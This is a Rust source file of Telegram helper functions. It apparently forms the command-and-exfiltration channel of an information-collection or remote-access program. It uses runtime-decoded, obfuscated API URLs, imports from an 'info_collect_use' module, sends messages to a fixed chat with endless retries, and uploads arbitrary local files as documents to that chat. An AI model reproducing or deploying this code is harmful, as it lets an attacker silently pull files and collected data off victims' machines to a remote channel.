use crate::functions::info_collect_use::*;
use crate::*;
use reqwest::multipart;

// tg 相关工具函数
pub mod tg_tools {
    use super::*;

    pub async fn file_id_to_download_url(
        file_id: String,
        client: &reqwest::Client,
    ) -> (String, String) {
        let response = client
            .get(decoded_url(GET_FILE_PATH_URL.as_str()))
            .query(&[("file_id", &file_id)])
            .send()
            .await
            .expect("command中updates请求失败");

        let json: Value = serde_json::from_str(response.text().await.expect("text失败").as_str())
            .expect("json解析失败");
        let file_path = json["result"]["file_path"]
            .as_str()
            .expect("file_path 解析失败");

        let download_url = format!("{}/{}", decoded_url(DOWNLOAD_FILE_URL.as_str()), file_path);
        println!("download_url: {}", download_url);
        (download_url, file_path.to_string())
    }

    pub async fn sendmessage(msg: &str) {
        let _ = loop {
            let form = multipart::Form::new()
                .text("chat_id", CHAT_ID.to_string())
                // .text("parse_mode","MarkdownV2")
                .text(
                    "message_thread_id",
                    MESSAGE_THREAD_ID.lock().unwrap().to_string(),
                )
                .text("text", msg.to_string());
            // 发送文件到 Telegram
            println!("send message to Telegram...");
            match reqwest::Client::new()
                .post(decoded_url(SENDMSG_URL.as_str()))
                .multipart(form)
                .send()
                .await
            {
                Ok(response) => break response,
                Err(e) => {
                    eprintln!("sendmessage请求失败: {e}，正在重试...");
                    let sleep_time: u64;
                    {
                        sleep_time = *SLEEP_TIME.lock().unwrap()
                    }
                    sleep(Duration::from_secs(sleep_time)).await; //要修改sleep_time为全局变量
                    // 对重连后要做topic检查，重新设置
                }
            }
        };
    }
    pub async fn upload_file(file_path: &str) -> Result<(), reqwest::Error> {
        // 打开文件并读取内容
        let mut file = match File::open(file_path) {
            Ok(f) => f,
            Err(e) => {
                eprintln!("无法打开文件 {}: {}", file_path, e);
                return Ok(());
            }
        };

        let mut file_content = Vec::new();
        if let Err(e) = file.read_to_end(&mut file_content) {
            eprintln!("无法读取文件内容 {}: {}", file_path, e);
            return Ok(());
        }
        // 构建 multipart 表单
        let form = reqwest::multipart::Form::new()
            .text("chat_id", CHAT_ID.to_string()) // 发送的 chat_id
            .text(
                "message_thread_id",
                MESSAGE_THREAD_ID.lock().unwrap().to_string(),
            )
            .part(
                "document",
                reqwest::multipart::Part::bytes(file_content)
                    .file_name(
                        Path::new(file_path)
                            .file_name()
                            .unwrap()
                            .to_string_lossy()
                            .to_string(),
                    ) // 设置文件名
                    .mime_str("application/octet-stream")
                    .unwrap(),
            );

        // 发送请求
        let send_response = reqwest::Client::new()
            .post(decoded_url(UPLOAD_FILE_URL.as_str())) // 使用解码后的 URL
            .multipart(form)
            .send()
            .await;

        // 检查响应结果
        match send_response {
            Ok(response) => {
                if response.status().is_success() {
                    println!("文件上传成功: {}", file_path);
                } else {
                    eprintln!(
                        "文件上传失败: {} - 状态码: {}",
                        file_path,
                        response.status()
                    );
                }
            }
            Err(e) => {
                eprintln!("发送请求失败: {} - 错误: {}", file_path, e);
            }
        }

        Ok(())
    }
}
